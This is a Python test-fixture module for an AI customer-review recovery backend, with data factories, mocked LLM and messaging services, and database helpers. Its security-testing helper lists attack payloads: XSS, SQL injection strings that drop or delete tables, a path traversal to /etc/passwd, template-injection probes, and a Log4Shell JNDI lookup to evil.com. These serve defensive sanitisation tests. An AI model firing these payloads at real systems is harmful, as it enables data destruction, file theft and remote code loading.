"""
Test fixtures and utilities for the Revive AI backend tests.
"""
import asyncio
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from unittest.mock import AsyncMock, MagicMock

import pytest
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.organization import Organization
from app.models.user import User, UserRole
from app.models.review import Review, UrgencyLevel
from app.models.customer import Customer
from app.models.support_ticket import SupportTicket
from app.models.recovery_action import RecoveryAction, ActionType
from app.models.agent_decision import AgentDecision, DecisionType


class TestDataFactory:
    """Factory for creating test data."""
    
    @staticmethod
    def create_organization_data(**kwargs) -> Dict:
        """Create organization test data."""
        defaults = {
            "name": "Test Organization",
            "domain": "test.com",
            "settings": {
                "auto_respond": True,
                "escalation_threshold": 0.8,
                "response_delay_minutes": 30
            }
        }
        defaults.update(kwargs)
        return defaults
    
    @staticmethod
    def create_user_data(**kwargs) -> Dict:
        """Create user test data."""
        defaults = {
            "email": f"test-{uuid.uuid4().hex[:8]}@example.com",
            "password_hash": "$2b$12$test.hash.for.testing.purposes",
            "role": UserRole.USER,
            "is_active": True
        }
        defaults.update(kwargs)
        return defaults
    
    @staticmethod
    def create_review_data(**kwargs) -> Dict:
        """Create review test data."""
        defaults = {
            "platform": "google",
            "external_id": f"review_{uuid.uuid4().hex[:8]}",
            "customer_name": "John Doe",
            "rating": 2,
            "content": "Service was terrible, waited 2 hours for my order.",
            "sentiment_score": 0.15,
            "urgency_level": UrgencyLevel.HIGH,
            "issue_categories": ["support", "quality"],
            "status": "pending",
            "requires_private_recovery": True,
            "created_at": datetime.utcnow()
        }
        defaults.update(kwargs)
        return defaults
    
    @staticmethod
    def create_customer_data(**kwargs) -> Dict:
        """Create customer test data."""
        defaults = {
            "email": f"customer-{uuid.uuid4().hex[:8]}@example.com",
            "phone": "+1234567890",
            "name": "Jane Smith",
            "churn_risk_score": 0.75,
            "bad_review_likelihood": 0.68,
            "last_interaction": datetime.utcnow() - timedelta(days=1),
            "context_summary": "Previous positive interactions, recent billing issue"
        }
        defaults.update(kwargs)
        return defaults
    
    @staticmethod
    def create_support_ticket_data(**kwargs) -> Dict:
        """Create support ticket test data."""
        defaults = {
            "external_id": f"ticket_{uuid.uuid4().hex[:8]}",
            "subject": "Billing Issue",
            "content": "I was charged twice for my order.",
            "status": "open",
            "priority": "high",
            "sentiment_score": 0.25,
            "created_at": datetime.utcnow()
        }
        defaults.update(kwargs)
        return defaults
    
    @staticmethod
    def create_recovery_action_data(**kwargs) -> Dict:
        """Create recovery action test data."""
        defaults = {
            "action_type": ActionType.EMAIL,
            "content": "We sincerely apologize for the inconvenience...",
            "status": "pending",
            "scheduled_at": datetime.utcnow() + timedelta(minutes=30),
            "created_at": datetime.utcnow()
        }
        defaults.update(kwargs)
        return defaults
    
    @staticmethod
    def create_agent_decision_data(**kwargs) -> Dict:
        """Create agent decision test data."""
        defaults = {
            "input_type": "review",
            "decision_type": DecisionType.RECOVER_PRIVATE,
            "confidence_score": 0.85,
            "reasoning": "Critical negative review requiring immediate private recovery",
            "created_at": datetime.utcnow()
        }
        defaults.update(kwargs)
        return defaults


class MockServices:
    """Mock external services for testing."""
    
    @staticmethod
    def create_mock_llm_service():
        """Create mock LLM service."""
        mock_service = AsyncMock()
        mock_service.generate_review_response.return_value = "Thank you for your feedback. We take all concerns seriously and will address this immediately."
        mock_service.generate_recovery_email.return_value = "Dear valued customer, we sincerely apologize for the inconvenience you experienced."
        mock_service.generate_apology_message.return_value = "We apologize for the service issues you encountered."
        mock_service.generate_discount_offer.return_value = "As an apology, we'd like to offer you a 15% discount on your next order."
        return mock_service
    
    @staticmethod
    def create_mock_email_service():
        """Create mock email service."""
        mock_service = AsyncMock()
        mock_service.send_email.return_value = {
            "message_id": f"email_{uuid.uuid4().hex[:8]}",
            "status": "sent",
            "timestamp": datetime.utcnow().isoformat()
        }
        mock_service.send_recovery_email.return_value = {
            "message_id": f"recovery_{uuid.uuid4().hex[:8]}",
            "status": "sent",
            "timestamp": datetime.utcnow().isoformat()
        }
        return mock_service
    
    @staticmethod
    def create_mock_whatsapp_service():
        """Create mock WhatsApp service."""
        mock_service = AsyncMock()
        mock_service.send_message.return_value = {
            "message_id": f"wa_{uuid.uuid4().hex[:8]}",
            "status": "sent",
            "timestamp": datetime.utcnow().isoformat()
        }
        mock_service.send_template_message.return_value = {
            "message_id": f"wa_template_{uuid.uuid4().hex[:8]}",
            "status": "sent",
            "timestamp": datetime.utcnow().isoformat()
        }
        return mock_service
    
    @staticmethod
    def create_mock_redis_client():
        """Create mock Redis client."""
        mock_redis = AsyncMock()
        mock_redis.get.return_value = None
        mock_redis.set.return_value = True
        mock_redis.delete.return_value = 1
        mock_redis.exists.return_value = False
        mock_redis.expire.return_value = True
        mock_redis.hget.return_value = None
        mock_redis.hset.return_value = True
        mock_redis.hdel.return_value = 1
        mock_redis.incr.return_value = 1
        mock_redis.decr.return_value = 0
        return mock_redis
    
    @staticmethod
    def create_mock_google_reviews_service():
        """Create mock Google Reviews service."""
        mock_service = AsyncMock()
        mock_service.fetch_reviews.return_value = [
            {
                "external_id": "google_123",
                "customer_name": "Test Customer",
                "rating": 4,
                "content": "Great service!",
                "created_at": datetime.utcnow().isoformat()
            }
        ]
        mock_service.post_response.return_value = {
            "response_id": "response_123",
            "status": "posted"
        }
        return mock_service


class DatabaseTestHelper:
    """Helper for database operations in tests."""
    
    @staticmethod
    async def create_test_organization(session: AsyncSession, **kwargs) -> Organization:
        """Create a test organization in the database."""
        data = TestDataFactory.create_organization_data(**kwargs)
        organization = Organization(**data)
        session.add(organization)
        await session.commit()
        await session.refresh(organization)
        return organization
    
    @staticmethod
    async def create_test_user(session: AsyncSession, organization: Organization, **kwargs) -> User:
        """Create a test user in the database."""
        data = TestDataFactory.create_user_data(**kwargs)
        data["organization_id"] = organization.id
        user = User(**data)
        session.add(user)
        await session.commit()
        await session.refresh(user)
        return user
    
    @staticmethod
    async def create_test_review(session: AsyncSession, organization: Organization, **kwargs) -> Review:
        """Create a test review in the database."""
        data = TestDataFactory.create_review_data(**kwargs)
        data["organization_id"] = organization.id
        review = Review(**data)
        session.add(review)
        await session.commit()
        await session.refresh(review)
        return review
    
    @staticmethod
    async def create_test_customer(session: AsyncSession, organization: Organization, **kwargs) -> Customer:
        """Create a test customer in the database."""
        data = TestDataFactory.create_customer_data(**kwargs)
        data["organization_id"] = organization.id
        customer = Customer(**data)
        session.add(customer)
        await session.commit()
        await session.refresh(customer)
        return customer
    
    @staticmethod
    async def create_test_support_ticket(session: AsyncSession, organization: Organization, 
                                       customer: Customer, **kwargs) -> SupportTicket:
        """Create a test support ticket in the database."""
        data = TestDataFactory.create_support_ticket_data(**kwargs)
        data["organization_id"] = organization.id
        data["customer_id"] = customer.id
        ticket = SupportTicket(**data)
        session.add(ticket)
        await session.commit()
        await session.refresh(ticket)
        return ticket
    
    @staticmethod
    async def create_test_recovery_action(session: AsyncSession, organization: Organization,
                                        customer: Customer, **kwargs) -> RecoveryAction:
        """Create a test recovery action in the database."""
        data = TestDataFactory.create_recovery_action_data(**kwargs)
        data["organization_id"] = organization.id
        data["customer_id"] = customer.id
        action = RecoveryAction(**data)
        session.add(action)
        await session.commit()
        await session.refresh(action)
        return action
    
    @staticmethod
    async def create_test_agent_decision(session: AsyncSession, organization: Organization,
                                       input_id: uuid.UUID, **kwargs) -> AgentDecision:
        """Create a test agent decision in the database."""
        data = TestDataFactory.create_agent_decision_data(**kwargs)
        data["organization_id"] = organization.id
        data["input_id"] = input_id
        decision = AgentDecision(**data)
        session.add(decision)
        await session.commit()
        await session.refresh(decision)
        return decision


class TestScenarios:
    """Common test scenarios and workflows."""
    
    @staticmethod
    async def create_complete_review_scenario(session: AsyncSession) -> Dict:
        """Create a complete review scenario with all related entities."""
        # Create organization
        organization = await DatabaseTestHelper.create_test_organization(session)
        
        # Create user
        user = await DatabaseTestHelper.create_test_user(session, organization)
        
        # Create customer
        customer = await DatabaseTestHelper.create_test_customer(session, organization)
        
        # Create review
        review = await DatabaseTestHelper.create_test_review(session, organization)
        
        # Create support ticket
        ticket = await DatabaseTestHelper.create_test_support_ticket(
            session, organization, customer
        )
        
        # Create recovery action
        recovery_action = await DatabaseTestHelper.create_test_recovery_action(
            session, organization, customer, review_id=review.id
        )
        
        # Create agent decision
        agent_decision = await DatabaseTestHelper.create_test_agent_decision(
            session, organization, review.id
        )
        
        return {
            "organization": organization,
            "user": user,
            "customer": customer,
            "review": review,
            "ticket": ticket,
            "recovery_action": recovery_action,
            "agent_decision": agent_decision
        }
    
    @staticmethod
    async def create_high_risk_customer_scenario(session: AsyncSession) -> Dict:
        """Create a high-risk customer scenario."""
        organization = await DatabaseTestHelper.create_test_organization(session)
        
        customer = await DatabaseTestHelper.create_test_customer(
            session, organization,
            churn_risk_score=0.95,
            bad_review_likelihood=0.88
        )
        
        # Create multiple negative tickets
        tickets = []
        for i in range(3):
            ticket = await DatabaseTestHelper.create_test_support_ticket(
                session, organization, customer,
                subject=f"Issue #{i+1}",
                priority="high",
                sentiment_score=0.1 + (i * 0.05)
            )
            tickets.append(ticket)
        
        # Create recovery actions
        recovery_actions = []
        for action_type in [ActionType.EMAIL, ActionType.CALL, ActionType.DISCOUNT]:
            action = await DatabaseTestHelper.create_test_recovery_action(
                session, organization, customer,
                action_type=action_type
            )
            recovery_actions.append(action)
        
        return {
            "organization": organization,
            "customer": customer,
            "tickets": tickets,
            "recovery_actions": recovery_actions
        }
    
    @staticmethod
    def create_property_test_data():
        """Create data generators for property-based testing."""
        from hypothesis import strategies as st
        
        return {
            "review_content": st.text(min_size=10, max_size=500),
            "rating": st.integers(min_value=1, max_value=5),
            "sentiment_score": st.floats(min_value=0.0, max_value=1.0),
            "email": st.emails(),
            "phone": st.text(min_size=10, max_size=15).filter(lambda x: x.isdigit()),
            "organization_name": st.text(min_size=3, max_size=100),
            "customer_name": st.text(min_size=2, max_size=50)
        }


# Utility functions for test setup and cleanup
async def setup_test_data(session: AsyncSession) -> Dict:
    """Set up comprehensive test data."""
    return await TestScenarios.create_complete_review_scenario(session)


async def cleanup_test_data(session: AsyncSession):
    """Clean up test data."""
    # Delete in reverse order of dependencies
    await session.execute("DELETE FROM agent_decisions")
    await session.execute("DELETE FROM recovery_actions")
    await session.execute("DELETE FROM support_tickets")
    await session.execute("DELETE FROM reviews")
    await session.execute("DELETE FROM customers")
    await session.execute("DELETE FROM users")
    await session.execute("DELETE FROM organizations")
    await session.commit()


def create_test_jwt_token(user_id: str, organization_id: str) -> str:
    """Create a test JWT token."""
    import jwt
    from datetime import datetime, timedelta
    
    payload = {
        "sub": user_id,
        "org_id": organization_id,
        "exp": datetime.utcnow() + timedelta(hours=1),
        "iat": datetime.utcnow(),
        "type": "access"
    }
    
    return jwt.encode(payload, "test-secret-key", algorithm="HS256")


def assert_response_structure(response_data: Dict, expected_keys: List[str]):
    """Assert that response has expected structure."""
    for key in expected_keys:
        assert key in response_data, f"Missing key '{key}' in response"


def assert_database_state(session: AsyncSession, model_class, expected_count: int):
    """Assert database state for a model."""
    # This would need to be implemented as an async function in practice
    pass


# Performance testing utilities
class PerformanceTestHelper:
    """Helper for performance testing."""
    
    @staticmethod
    def measure_execution_time(func):
        """Decorator to measure execution time."""
        import time
        import functools
        
        @functools.wraps(func)
        async def wrapper(*args, **kwargs):
            start_time = time.time()
            result = await func(*args, **kwargs)
            end_time = time.time()
            execution_time = end_time - start_time
            return result, execution_time
        
        return wrapper
    
    @staticmethod
    def assert_performance_threshold(execution_time: float, threshold: float, operation: str):
        """Assert that execution time is within threshold."""
        assert execution_time <= threshold, \
            f"{operation} took {execution_time:.3f}s, exceeding threshold of {threshold}s"


# Security testing utilities
class SecurityTestHelper:
    """Helper for security testing."""
    
    @staticmethod
    def create_malicious_payloads() -> List[str]:
        """Create common malicious payloads for testing."""
        return [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%=7*7%>",
            "${7*7}",
            "#{7*7}",
            "javascript:alert('xss')"
        ]
    
    @staticmethod
    def create_injection_test_cases() -> List[Dict]:
        """Create SQL injection test cases."""
        return [
            {"input": "'; DROP TABLE users; --", "expected": "sanitized"},
            {"input": "1' OR '1'='1", "expected": "sanitized"},
            {"input": "admin'--", "expected": "sanitized"},
            {"input": "1; DELETE FROM users", "expected": "sanitized"}
        ]